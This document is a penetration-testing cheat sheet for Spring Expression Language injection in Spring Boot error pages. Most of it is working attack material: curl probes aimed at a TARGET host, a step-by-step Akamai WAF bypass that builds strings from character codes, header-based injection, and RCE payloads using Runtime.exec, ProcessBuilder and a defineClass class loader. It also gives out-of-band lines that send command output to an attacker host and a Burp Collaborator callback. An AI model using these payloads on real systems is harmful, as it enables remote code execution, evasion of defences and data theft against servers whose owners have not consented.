# Spring Expression Language (SpEL) Injection — WAF Bypass & RCE

## Overview

Spring Boot apps that render exception messages in error pages may evaluate SpEL expressions recursively. If user input reaches an exception message and is rendered by the Whitelabel Error Page, `${7*7}` becomes `49`, and `${T(java.lang.Runtime).getRuntime().exec('id')}` becomes RCE.

**No CVE exists for this** — it's the well-known Spring Boot error page behavior: [spring-projects/spring-boot#4763](https://github.com/spring-projects/spring-boot/issues/4763).

## Detection

```bash
# Step 1: Math test — if 49 appears in response, SpEL is evaluated
curl -sk "https://TARGET/?q=\${7*7}"

# Step 2: Class discovery — if class name appears, you have full SpEL access
curl -sk "https://TARGET/?q=\${2.class}"

# Step 3: Confirmed injection — now build the RCE chain
```

## Where to Test

- Search parameters: `?q=`, `?search=`, `?query=`, `?id=`, `?name=`
- Path parameters: `/user/{name}`
- POST body fields: `{"name": "..."}`
- HTTP headers: `Referer`, `User-Agent`, `X-Custom` (WAF may not inspect these)
- Error message reflection: any input that triggers a 400/500 with the input in the error text
- PDF generators, email templates, invoice names

## Akamai WAF Bypass (Proven — pmnh.site Writeup)

### What Akamai Blocks
- `T(java.lang.Runtime)` — the T() operator with known dangerous classes
- Single and double quote characters
- `Class.forName()` with string arguments
- Constructor invocations: `new`, `newInstance`
- The `*` (multiply) and `-` (subtract) operators in headers

### What Gets Through
- `${2.class}` — class references
- `${2+2}` — addition
- `${2/1}` — division
- `${2.toString()}` — basic method calls
- `${T(java)}` — partial T() references (varies by WAF config)

### Character-by-Character String Construction (No Quotes)

Since quotes are blocked, build every string from ASCII values via `Character.toString(int)`:

```java
// Get the Character class without using T()
${(2.toString()+2).charAt(0).class}

// Convert ASCII value to character
${(2.toString()+2).charAt(0).class.toString(99)}  // → 'c'

// Build "java.lang.Runtime" character by character
// j=106, a=97, v=118, a=97, .=46, l=108, a=97, n=110, g=103, .=46, R=82, u=117, n=110, t=116, i=105, m=109, e=101
```

### Full Attack Chain

1. **Get any Class reference:**
   ```
   ${2.class} → class java.lang.Integer
   ```

2. **Get Character class (for char construction):**
   ```
   ${(2.toString()+2).charAt(0).class} → class java.lang.Character
   ```

3. **Build string character by character:**
   ```
   ${(2.toString()+2).charAt(0).class.toString(106)} → 'j'
   ```

4. **Get Class.forName via reflection, then Runtime:**
   Use reflection to call `Class.forName("java.lang.Runtime")` with the character-built string, then `getRuntime()`, then `exec("command")`.

5. **Read command output:**
   Use `org.apache.commons.io.IOUtils.toString()` on `getInputStream()`.

### Equivalent Conceptual Payload
```
org.apache.commons.io.IOUtils.toString(
    java.lang.Runtime.getRuntime().exec("uname -a").getInputStream()
)
```
(Every string built character-by-character, ~3KB final payload)

## Header-Based Bypass (When URL Params Are Blocked)

If the WAF blocks URL query parameters but passes headers, inject SpEL through headers:

```bash
# Test which headers bypass the WAF
curl -sk -H "Referer: \${2.class}" "https://TARGET/"
curl -sk -H "X-Custom: \${2+2}" "https://TARGET/"
curl -sk -H "Accept-Language: \${T(java)}" "https://TARGET/"

# Check for SpEL evaluation via timing
time curl -sk -H "Referer: \${T(java.lang.Thread).sleep(3000)}" "https://TARGET/"
```

## OOB Exfiltration (When Response Is Blind)

If SpEL is evaluated but the result isn't visible:

```java
// DNS callback
${T(java.net.URL).new('http://PAYLOAD.burpcollaborator.net/').openConnection().getContent()}

// HTTP exfiltration of command output
${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER.com/$(id|base64)')}
```

## Quick WAF Test Matrix

| Payload | WAF Response | Backend Response | Conclusion |
|---------|-------------|-----------------|------------|
| `?q=test` | 200 | "results for test" | WAF allows param |
| `?q=${7*7}` | 200 | "results for 49" | **SpEL confirmed** |
| `?q=${7*7}` | 403 | — | WAF blocks `${` |
| `?q=${7*7}` | 200 | "results for ${7*7}" | SpEL not evaluated |
| `?q=${2.class}` | 200 | "class java.lang..." | **Full SpEL access** |
| `-H "X: ${2.class}"` | 200 | — | Header bypass works |

## Detection Payloads (Least → Most Aggressive)

```
${7*7}                          → 49 (math eval)
${2.class}                      → class java.lang.Integer
${2.toString()}                 → "2"
${"test".length()}              → 4
${T(java.lang.String)}          → class java.lang.String
${T(java.lang.Runtime)}         → class java.lang.Runtime (WAF may block)
```

## RCE Payloads

```java
// Direct Runtime.exec
${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/$(id)')}

// ProcessBuilder
${new java.lang.ProcessBuilder('id').start()}

// Spring-specific (if on classpath)
${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.springframework.util.Base64Utils).decodeFromString('...'),T(Thread).currentThread().getContextClassLoader())}
```

## Practice Lab

[jzheaux/spel-injection](https://github.com/jzheaux/spel-injection) — Local Spring Boot app for testing SpEL payloads.

## Reference

Full writeup: [pmnh.site/post/writeup_spring_el_waf_bypass](https://www.pmnh.site/post/writeup_spring_el_waf_bypass/)
